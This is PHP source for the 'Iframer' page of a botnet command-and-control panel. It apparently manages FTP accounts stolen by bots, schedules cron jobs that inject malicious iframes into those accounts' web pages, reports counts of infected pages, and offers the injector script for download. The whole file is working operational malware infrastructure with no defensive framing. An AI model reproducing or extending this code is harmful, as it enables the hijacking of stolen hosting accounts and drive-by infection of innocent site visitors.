<?php
require 'system/lib/db.php';
require 'system/lib/guiutil.php';

if (isset($_GET['ajax'])){
	switch ($_GET['ajax']){
		case 'download-iframer': # not AJAX: just a download proxy :)
			header('Content-disposition: attachment; filename=iframer.php');
			header('Content-type: text/x-php');

			readfile('system/utils/iframer.script.php');
			break;
		case 'ignore_acc':
			mysql_q(mkquery('UPDATE `botnet_rep_iframer` SET `ignore`=IF(`ignore`=1, 0, 1) WHERE `id`={i:acc}', $_GET));
			break;
		case 'accounts_reset':
			if (mysql_q('DELETE FROM `botnet_rep_iframer` WHERE `ignore`<>1;')
				&& mysql_q('UPDATE `botnet_rep_iframer` SET `found_at`=UNIX_TIMESTAMP();')){
				header('Location: ?'.mkuri(1, 'm'));
				}
			break;
		}
	die();
	}



ThemeBegin(LNG_MM_SERVICE_IFRAMER, 0, getBotJsMenu('botmenu'), 0);

/* ==========[ CronJobs ]========== */

echo str_replace(array('{WIDTH}','{COLUMNS_COUNT}','{TEXT}'),array('100%', 1, LNG_IFRAMER_STATE), THEME_LIST_BEGIN.THEME_LIST_TITLE), '<tr><td>';

$CRON = include 'system/cron.php'; /** @var CronJobsMan $CRON */
$jobs = $CRON->get_jobs('cronjobs_iframer');
$jobs_human = array(
	LNG_IFRAMER_STATE_ACCOUNTS_SEARCH => $jobs['cronjobs_iframer::cronjob_new_accounts'],
	LNG_IFRAMER_STATE_POST_TASK => $jobs['cronjobs_iframer::cronjob_iframer_launch'],
	LNG_IFRAMER_STATE_COLLECT_RESULTS => $jobs['cronjobs_iframer::cronjob_iframer_collect'],
	);

echo '<table id="cronjobs" class="lined">',
	'<THEAD><tr>',
		'<th>', LNG_IFRAMER_STATE_TH_TASK, '</th>',
		'<th>', LNG_IFRAMER_STATE_TH_LAUNCHED, '</th>',
		'<th>', LNG_IFRAMER_STATE_TH_RESULT, '</th>',
		'<th>', LNG_IFRAMER_STATE_TH_DETAILS, '</th>',
		'</tr></THEAD>',
	'<TBODY>';

	foreach($jobs_human as $job_humanname => $job){ /** @var _CronJobMethod $job */
		echo '<tr>';
		echo '<th>', '<a href="system/cron.php/', $job->fullname, '?" title="', $job->fullname, '">', $job_humanname, '</a>', '</th>';

		if (is_null($job->meta) || is_null($job->meta->exec_last)){
			echo '<td colspan=3 class="never">', LNG_IFRAMER_TASK_NEVER, '</td>';
			continue;
			}

		echo '<td>', timeago(  time()-$job->meta->exec_last  ), '</td>';

		if (!is_null($job->meta->last_error))
			echo '<td class="error">', htmlspecialchars($job->meta->last_error), '</td>';
			else
			echo '<td class="okay">', 'ok', '</td>';

		echo '<td>', json_encode($job->meta->last_result), '</td>';
		}

echo '</TBODY>',
	'</table>';

echo '<div align=right>',
		' <a href="?', mkuri(1, 'm'), '&ajax=download-iframer" />', LNG_AJAX_DOWNLOAD, '</a>',
		' <a href="?m=ajax_config&action=Iframer" class="ajax_colorbox" />', LNG_AJAX_CONFIG, '</a>',
		'</div>';

# http://192.168.1.3/system/utils/iframer.script.php?action=dump
echo "\n";
echo '</td></tr></table>';

/* ==========[ Accounts ]========== */

$reset = '<a href="?'.mkuri(1,'m').'&ajax=accounts_reset" id="accounts-reset">['. LNG_IFRAMER_ACCOUNTS_RESET. ']</a>';

echo str_replace(array('{WIDTH}','{COLUMNS_COUNT}','{TEXT}'),array('100%', 1, LNG_IFRAMER_ACCOUNTS . $reset), THEME_LIST_BEGIN.THEME_LIST_TITLE), '<tr><td>';

# Statistics
$acc_stat = mysql_fetch_assoc(mysql_q(mkquery(
	'SELECT
	 	COUNT(*) AS `total`,
	 	SUM(`found_at`>={i:day_thr}) AS `day`,
	 	SUM(`found_at`>={i:week_thr}) AS `week`,
	 	SUM(`found_at`>={i:month_thr}) AS `month`,
	 	SUM(`posted_at` IS NULL) AS `waiting`,
	 	SUM(`posted_at` IS NOT NULL AND `iframed_at` IS NULL) AS `pending`,
	 	SUM(`is_valid` IS NOT NULL AND `is_valid`=0) AS `invalid`,
	 	SUM(`is_valid` IS NOT NULL AND `is_valid`=1) AS `valid`,
	 	SUM(`s_page_count` IS NOT NULL AND `s_page_count`>0) AS `iframed`,
	 	SUM(COALESCE(`s_page_count`, 0)) AS `pages`,
	 	SUM(`ignore`=1) AS `ignored`
	 FROM `botnet_rep_iframer`
	 ;
	'
	, array(
		'day_thr' => time()-60*60*24,
		'week_thr' => time()-60*60*24*7,
		'month_thr' => time()-60*60*24*31,
	))));

echo '<div id="accounts-stat">',
		'<dl>',
			'<dt><a href="#" data-filter="*">', LNG_IFRAMER_ACCOUNTS_STAT_ACCOUNTS, '</a></dt>',
				'<dd>',
					LNG_IFRAMER_ACCOUNTS_STAT_ACCOUNTS_TOTAL, ': ', $acc_stat['total'], ', ',
					LNG_IFRAMER_ACCOUNTS_STAT_ACCOUNTS_DAY, ': ', $acc_stat['day'], ', ',
					LNG_IFRAMER_ACCOUNTS_STAT_ACCOUNTS_WEEK, ': ', $acc_stat['week'], ', ',
					LNG_IFRAMER_ACCOUNTS_STAT_ACCOUNTS_MONTH, ': ', $acc_stat['month'],
					'</dd>',
			'<dt><a href="#" data-filter=".empty,.iframed">', LNG_IFRAMER_ACCOUNTS_STAT_CHECKED, '</a></dt>',
				'<dd>',
					LNG_IFRAMER_ACCOUNTS_STAT_CHECKED_WAITING, ': ', $acc_stat['waiting'], ', ',
					LNG_IFRAMER_ACCOUNTS_STAT_CHECKED_PENDING, ': ', $acc_stat['pending'], ', ',
					LNG_IFRAMER_ACCOUNTS_STAT_CHECKED_VALID, ': ', $acc_stat['valid'], ', ',
					LNG_IFRAMER_ACCOUNTS_STAT_CHECKED_INVALID, ': ', $acc_stat['invalid'], ', ',
					LNG_IFRAMER_ACCOUNTS_STAT_CHECKED_IGNORED, ': ', $acc_stat['ignored'], ', ',
					'</dd>',
			'<dt><a href="#" data-filter=".iframed">', LNG_IFRAMER_ACCOUNTS_STAT_IFRAMED, '</a></dt>',
				'<dd>',
					LNG_IFRAMER_ACCOUNTS_STAT_IFRAMED_ACCS, ': ', $acc_stat['iframed'], ', ',
					LNG_IFRAMER_ACCOUNTS_STAT_IFRAMED_PAGES, ': ', $acc_stat['pages'],
					'</dd>',
			'</dl>',
		'</div>';

# Accounts

$process_delay = empty($GLOBALS['config']['iframer']['opt']['process_delay'])? 12 : $GLOBALS['config']['iframer']['opt']['process_delay'];
$R = mysql_q(mkquery(
	'SELECT *, COALESCE(`iframed_at`, `posted_at`, `found_at`) AS `event_at` FROM `botnet_rep_iframer`
	 WHERE (`ignore`=0 OR `found_at`>={i:ignore_thr}) AND (`iframed_at` IS NULL OR `iframed_at`>={i:invalid_thr} OR `is_valid`=1)
	 ORDER BY `event_at` DESC',
	array(
		'ignore_thr' => time() - 60*60*24*$process_delay * 2,
		'invalid_thr' => time() - 60*60*24*1,
	)));

echo '<table id="accounts" class="lined">';
echo '<THEAD>',
	'<th>', LNG_IFRAMER_TH_ACCOUNT, '</th>',
	'<th>', LNG_IFRAMER_TH_STATE, '</th>',
	'<th>', LNG_IFRAMER_TH_ERRORS, '</th>',
	'<th>', LNG_IFRAMER_TH_IFRAMED_PAGES, '</th>',
	'<th>', LNG_IFRAMER_TH_STAT, '</th>',
	'<th>', LNG_IFRAMER_TH_ACTIONS, '</th>',
	'</THEAD>';
echo '<TBODY>';
while ($R && !is_bool($r = mysql_fetch_assoc($R))){
	$classes = array();
	$state = null;
	if ($r['ignore']){
		$classes[] = 'ignored';
		$state = LNG_IFRAMER_STATE_IGNORED;
		}
	elseif (is_null($r['posted_at'])){
		$classes[] = 'queued';
		$state = LNG_IFRAMER_STATE_QUEUED;
		}
	elseif (is_null($r['iframed_at'])){
		$classes[] = 'pending';
		$state = LNG_IFRAMER_STATE_PENDING;
		}
	elseif (!$r['is_valid']){
		$classes[] = 'invalid';
		$state = LNG_IFRAMER_STATE_INVALID;
		}
	elseif ($r['s_page_count'] == 0){
		$classes[] = 'empty';
		$state = LNG_IFRAMER_STATE_VALID_EMPTY;
		}
	else {
		$classes[] = 'iframed';
		$state = LNG_IFRAMER_STATE_IFRAMED;
		}

	echo '<tr class="', implode(' ', $classes), '">';
	# Account
	echo '<th>', $r['ftp_acc'], '</th>';
	# State
	echo '<td>', $state, '</td>';
	# Errors
	$errors_count = substr_count($r['s_errors'], "\n") + (int)(strlen($r['s_errors'])>0);
	$collapsed = false;
	if ($errors_count>3)
		$collapsed = ($r['s_page_count']>0) || ($errors_count>15) || (!is_null($r['iframed_at']) && (time()-$r['iframed_at']) > 60*60*24*2);

	echo '<td class="errors ', $collapsed? 'collapsed': '', '">',
		'<a href="#">(', $errors_count, ')</a>',
		'<ol>', str_replace("\n", '<li>', "\n".$r['s_errors']), '</ol>',
		'</td>';
	# Pages
	echo '<td class="iframed_pages">',
		$r['s_page_count'] ? '<a href="#">( ' . $r['s_page_count'] . ' )</a>' : '-',
		'<ol>', str_replace("\n", '<li>', "\n".$r['s_pages']), '</ol>',
		'</td>';
	# Stat
	$stat = json_decode($r['s_stat'], true);
	echo '<td class="statistics">';
	if ($stat) {
		echo '<a href="#">...</a>';
		echo '<table>',
			'<tr><th>Found</th>',	'<td>', $stat['found']['dirs'],		' / ', $stat['found']['files'], '</td></tr>',
			'<tr><th>Failed</th>',	'<td>', $stat['failed']['dirs'],	' / ', $stat['failed']['files'], '</td></tr>',
			'<tr><th>Matched</th>',	'<td>', $stat['matched']['dirs'],	' / ', $stat['matched']['files'], '</td></tr>',
			'</table>';
		}
	echo '</td>';
	# Ignore
	echo '<td class="ignore">';
	if (is_null($r['posted_at']))
		echo '<a href="?'.mkuri(1,'m').'&ajax=ignore_acc&acc=', urlencode($r['id']) ,'" data-action="ignore"><img src="theme/images/icons/ignore.png" title="', LNG_IFRAMER_ACTION_IGNORE, '" /></a>';
	echo '</td>';

	echo '</tr>';
	}
echo '</TBODY>';
echo '</table>';

echo '</td></tr></table>', THEME_LIST_END;

echo <<<HTML
<script src="theme/js/page-iframer.js"></script>
HTML;

echo THEME_DIALOG_END, ThemeEnd();
